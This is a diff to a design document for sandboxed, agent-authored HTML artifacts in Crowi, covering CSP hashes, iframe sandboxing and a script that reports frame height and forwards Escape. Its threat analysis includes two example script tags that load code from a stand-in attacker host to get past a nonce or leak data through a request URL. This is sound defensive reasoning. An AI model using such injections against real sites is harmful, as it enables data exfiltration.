@@ -70,7 +70,7 @@ Everything in the delivery design follows from closing that specific hole.
   2. GET /a/{rev}?t={token}                                  |
   --------------------------------------------------------->|
                           |          verify HMAC, exp, revision match
-                          |          serve stored HTML + height reporter
+                          |          serve stored HTML + frame bridge
                           |          + CSP, + sandbox, no Set-Cookie
   <---------------------------------------------------------|
                           |                                  |
@@ -103,7 +103,7 @@ One adjustment is required. RFC-0009's safety valve triggers on large pastes, wh
 
 ### Normalisation happens at ingest
 
-Validation and normalisation run once, on write, and the result is what gets stored. Read serves the stored bytes unchanged, followed by one fixed script that reports the document's height (see *Delivery: frame height*). This keeps artifacts free of derived data and keeps the served bytes auditable: everything past the stored bytes is a constant. The single configurable input to delivery is the web-font setting, and turning it off degrades a stored artifact's typography rather than breaking it, so a policy change cannot leave an existing artifact inoperable. See *No external references*.
+Validation and normalisation run once, on write, and the result is what gets stored. Read serves the stored bytes unchanged, followed by one fixed script, the frame bridge (see *Delivery: frame bridge*). This keeps artifacts free of derived data and keeps the served bytes auditable: everything past the stored bytes is a constant. The single configurable input to delivery is the web-font setting, and turning it off degrades a stored artifact's typography rather than breaking it, so a policy change cannot leave an existing artifact inoperable. See *No external references*.
 
 Ingest rejects, rather than sanitising:
 
@@ -160,7 +160,7 @@ The two font origins in brackets are present only when the web-font setting is e
 
 **Inline code is authorised by hash, not by nonce.** An earlier draft used a per-revision nonce: ingest generated one, injected it onto every accepted inline `<script>` and `<style>`, and recorded it in a reserved `<meta>` so delivery could emit `script-src 'nonce-…'` without reparsing the body. That design is unsound, and the flaw is fatal rather than incidental. A nonce authorises *an element that carries it*, whatever that element loads; and the nonce has to be readable, because it sits in the served bytes. An accepted inline script can therefore read it and append `<script nonce="…" src="https://attacker.example/x.js">`, which the policy then authorises. Every external reference this design rejects at ingest becomes reachable at runtime, which empties the self-contained guarantee of its meaning.
 
-A hash has no such property. `'sha256-…'` matches one exact body of inline code and nothing else, so an attacker-authored element — external or inline — matches no hash and does not run. Ingest computes the digest of each accepted inline block and records it in a reserved `<meta>`; delivery reads those markers and emits the hashes, still serving the stored bytes unchanged. No attribute is injected onto the blocks themselves. The one hash delivery adds on its own is the height reporter's (see *Delivery: frame height*), which leads `script-src` whether or not the document has scripts of its own.
+A hash has no such property. `'sha256-…'` matches one exact body of inline code and nothing else, so an attacker-authored element — external or inline — matches no hash and does not run. Ingest computes the digest of each accepted inline block and records it in a reserved `<meta>`; delivery reads those markers and emits the hashes, still serving the stored bytes unchanged. No attribute is injected onto the blocks themselves. The one hash delivery adds on its own is the frame bridge's (see *Delivery: frame bridge*), which leads `script-src` whether or not the document has scripts of its own.
 
 One residual remains, and it is accepted rather than closed. CSP Level 3 lets a hash-source in `script-src` also match an *external* `<script>` whose `integrity` attribute carries the same hash, and the policy must not rely on browsers declining to implement that. An accepted inline script can therefore append `<script src="https://attacker.example/x.js" integrity="sha256-<its own digest>">` at runtime, and the browser issues that request even under `connect-src 'none'`. Subresource integrity then refuses to run anything but the identical bytes, so no new code executes; what escapes is the request itself, with whatever the script encoded into the URL and the viewer's IP and user agent. No directive closes this path: a nonce is readable by the script that carries it and is strictly weaker, and Trusted Types would break most existing libraries. It is accepted because it takes a deliberately hostile author, exposes only what the artifact itself already knows, cannot reach the Crowi session or API, and is no worse than what an ordinary Markdown page can already do with an external image.
 
@@ -199,7 +199,7 @@ An artifact page keeps the chrome of a Markdown page and replaces only the part 
 
 **Width.** Markdown pages reserve a right rail for the table of contents and cap the body at a readable measure. Neither applies to an artifact. There is no heading structure to extract, so the rail has nothing to hold; and the width cap exists to keep prose lines readable, which is a property of prose rather than of a rendering surface. **Both go together.** Removing the rail alone would leave the artifact at the same capped width with empty space beside it, which is the worst of the two layouts. An artifact page's column therefore spans the body column and the rail together, and it is the whole column that widens — title, page actions, body, and the comments and backlinks under it — since a wide body under a prose-width header and prose-width comments reads as two layouts on one page. It does not bleed to the viewport edge: the left edge stays where a Markdown page's is, and the application header widens to the same right edge.
 
-**Maximizing.** A wide artifact can be maximized to fill the viewport, and from there put into the browser's full screen where the browser allows it for an arbitrary element (not iPhone Safari). The frame is restyled in place rather than moved into a dialog: moving an iframe reloads it, which would discard what the reader did inside the artifact and, once the one-minute signed URL has expired, fail to load at all. The sandboxed-content indicator stays visible in the maximized view. The artifact itself is never granted full screen; only the shell's own control requests it.
+**Maximizing.** A wide artifact can be maximized to fill the viewport, and from there put into the browser's full screen where the browser allows it for an arbitrary element (not iPhone Safari). The frame is restyled in place rather than moved into a dialog: moving an iframe reloads it, which would discard what the reader did inside the artifact and, once the one-minute signed URL has expired, fail to load at all. Escape restores it, including while focus is inside the artifact (see *Delivery: frame bridge*). The sandboxed-content indicator stays visible in the maximized view. The artifact itself is never granted full screen; only the shell's own control requests it.
 
 **Menu.** The page menu divides three ways rather than two.
 
@@ -234,15 +234,17 @@ The page shell embeds the artifact with `sandbox="allow-scripts"` and nothing el
 
 The practical cost is that `localStorage` and `sessionStorage` are unavailable inside artifacts. This is not a meaningful loss for the target use case, and agent-authored artifacts are already conventionally written without browser storage.
 
-### Delivery: frame height
+### Delivery: frame bridge
 
 The frame is sized to the artifact's content, so the page scrolls as one document instead of carrying a second scrollbar inside the frame. Only the artifact can measure that height: it runs on an opaque origin, so the page cannot read its layout.
 
-Delivery therefore appends one fixed script after the stored document. It observes the document's size and posts `{ type: 'crowi:artifact-height', height }` to the page shell, which sits two frames up. Because the script is a constant, so is its digest, and delivery puts that digest first in `script-src` for every artifact, including one with no scripts of its own. The stored bytes are not touched: the download route serves exactly what was stored, and the fetch–edit–save loop never sees the script.
+Delivery therefore appends one fixed script, the frame bridge, after the stored document. It observes the document's size and posts `{ type: 'crowi:artifact-height', height }` to the page shell, which sits two frames up. Because the script is a constant, so is its digest, and delivery puts that digest first in `script-src` for every artifact, including one with no scripts of its own. The stored bytes are not touched: the download route serves exactly what was stored, and the fetch–edit–save loop never sees the script.
 
 The page shell accepts a report only from the artifact's window, recognised by identity because its origin is opaque, and only as a finite positive number, capped so that an artifact cannot stretch the page without bound. The artifact's own code can post the same message, which grants it nothing it could not already do by making its content taller. Until a report arrives, the frame keeps a fixed viewport-relative height and the artifact scrolls inside it.
 
 A document sized from the viewport, such as a body with `min-height: 100vh` plus padding, overflows by the same amount at every frame height, so following it would grow the frame forever. The script withholds a report when the viewport has grown since its last one and the overflow is unchanged, and that remainder scrolls inside the frame.
+
+The same script forwards Escape. Key events inside the cross-origin frame never reach the page shell's listeners, so without it a maximized frame could not be restored from the keyboard while focus is inside it. The script posts `{ type: 'crowi:artifact-escape' }` for an Escape the artifact did not cancel, checked after the artifact's own listeners have run, so an artifact that uses Escape for itself keeps it. The page shell accepts the message under the same window-identity check as a height report and ignores it in full screen, where Escape belongs to the browser.
 
 ### No external references
 
@@ -272,7 +274,7 @@ The shell displays a persistent indicator that the frame contains sandboxed, age
 
 **`Revision.type` is authoritative.** Type is a property of the stored bytes. Deriving it from `Page` alone would render historical revisions with the wrong renderer after a type conversion.
 
-**Ingest-time normalisation, unchanged read.** Keeps artifacts free of derived data and keeps served bytes auditable: the stored bytes go out as stored, followed only by the constant height reporter.
+**Ingest-time normalisation, unchanged read.** Keeps artifacts free of derived data and keeps served bytes auditable: the stored bytes go out as stored, followed only by the constant frame bridge.
 
 **Reject rather than sanitise.** Silent stripping produces silent breakage that the authoring agent cannot diagnose.
 
